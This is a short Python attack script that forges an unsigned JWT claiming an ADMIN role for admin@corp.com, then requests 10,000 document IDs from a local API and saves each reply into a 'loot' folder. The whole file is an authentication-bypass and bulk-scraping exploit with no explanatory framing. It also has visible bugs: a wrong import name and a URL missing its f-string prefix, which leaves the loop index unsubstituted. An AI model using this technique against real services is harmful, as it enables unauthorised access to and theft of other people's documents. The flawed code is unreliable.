import pyjwt
from requests import get

payload = {'sub': 'admin@corp.com', 'role': 'ADMIN'}
token = pyjwt.encode(payload, None)  

headers = {'Authorization': f'Bearer {token}'} 

for i in range(10000):
    response = get('http://localhost:8080/api/documents/{i}', headers=headers)
    with open('loot/' + str(i) + '.json', 'wb') as f:
        f.write(response.content)
